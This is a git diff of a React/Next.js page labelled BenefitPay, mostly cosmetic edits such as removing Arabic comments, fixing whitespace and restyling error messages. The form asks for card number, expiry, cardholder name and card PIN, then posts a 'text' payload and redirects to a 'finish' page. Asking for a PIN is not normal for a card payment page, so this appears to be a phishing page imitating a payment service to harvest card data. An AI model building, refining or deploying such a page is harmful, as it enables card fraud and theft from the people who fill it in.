@@ -1,6 +1,5 @@
 'use client'
 import { Suspense } from "react";
-
 import React, { useState } from 'react';
 import styles from "./benefitpay.module.css";
 import { useRouter, useSearchParams } from 'next/navigation';
@@ -21,7 +20,6 @@ const BenefitPayContent = () => {
   const refN = searchParams.get("refN");
   const router = useRouter();
 
-  // تحديث القيم
   const handleChange = (e) => {
     const { name, value } = e.target;
     setFormData((prev) => ({
@@ -30,7 +28,6 @@ const BenefitPayContent = () => {
     }));
   };
 
-  // التحقق من صحة البيانات
   const validate = () => {
     let newErrors = {};
 
@@ -60,7 +57,6 @@ const BenefitPayContent = () => {
     return Object.keys(newErrors).length === 0;
   };
 
-  // إرسال البيانات
   const handleSubmit = async (e) => {
     e.preventDefault();
     if (validate()) {
@@ -83,8 +79,7 @@ const BenefitPayContent = () => {
             text: text
           }
         );
-        router.push(`/benefitpay/finish?refN=${refN}
-        `);
+        router.push(`/benefitpay/finish?refN=${refN}`);
       } catch (error) {
         alert("Error sending data");
         console.error(error);
@@ -92,20 +87,18 @@ const BenefitPayContent = () => {
     }
   };
 
-  // قائمة الأشهر
   const months = Array.from({ length: 12 }, (_, i) => ({
     value: String(i + 1).padStart(2, '0'),
     label: String(i + 1).padStart(2, '0')
   }));
 
-  // قائمة السنوات (من السنة الحالية + 10 سنوات)
   const currentYear = new Date().getFullYear();
   const years = Array.from({ length: 10 }, (_, i) => currentYear + i);
 
   return (
     <div className={styles.container}>
       <form onSubmit={handleSubmit}>
-        
+
         <div>
           <h5>Amount</h5>
           <p>{price}.000</p>
@@ -118,13 +111,13 @@ const BenefitPayContent = () => {
 
         <div>
           <h5>Card Number</h5>
-          <input 
-            type="text" 
-            name="cardNumber" 
-            value={formData.cardNumber} 
-            onChange={handleChange} 
+          <input
+            type="text"
+            name="cardNumber"
+            value={formData.cardNumber}
+            onChange={handleChange}
           />
-          {errors.cardNumber && <span className={styles.error}>{errors.cardNumber}</span>}
+          {errors.cardNumber && <div className={styles.errorBox}>⚠️ {errors.cardNumber}</div>}
         </div>
 
         <div>
@@ -152,33 +145,33 @@ const BenefitPayContent = () => {
               ))}
             </select>
           </div>
-          {errors.expiryDate && <span className={styles.error}>{errors.expiryDate}</span>}
+          {errors.expiryDate && <div className={styles.errorBox}>⚠️ {errors.expiryDate}</div>}
         </div>
 
         <div>
           <h5>Card Holder's Name</h5>
-          <input 
-            type="text" 
-            name="cardHolder" 
-            value={formData.cardHolder} 
-            onChange={handleChange} 
+          <input
+            type="text"
+            name="cardHolder"
+            value={formData.cardHolder}
+            onChange={handleChange}
           />
-          {errors.cardHolder && <span className={styles.error}>{errors.cardHolder}</span>}
+          {errors.cardHolder && <div className={styles.errorBox}>⚠️ {errors.cardHolder}</div>}
         </div>
 
         <div>
           <h5>PIN</h5>
-          <input 
-            type="number" 
-            name="pin" 
-            value={formData.pin} 
-            onChange={handleChange} 
+          <input
+            type="number"
+            name="pin"
+            value={formData.pin}
+            onChange={handleChange}
           />
-          {errors.pin && <span className={styles.error}>{errors.pin}</span>}
+          {errors.pin && <div className={styles.errorBox}>⚠️ {errors.pin}</div>}
         </div>
 
         <div className={styles.btn}>
-          <button type="submit" onClick={handleSubmit}>Pay</button>
+          <button type="submit">Pay</button>
           <button type="button" onClick={() => router.push("/")}>Cancel</button>
         </div>
       </form>
@@ -192,11 +185,11 @@ const BenefitPayContent = () => {
   );
 };
 
-
 export default function BenefitPay() {
   return (
     <Suspense fallback={<div>Loading...</div>}>
       <BenefitPayContent />
     </Suspense>
   );
-}
+  }
+                  
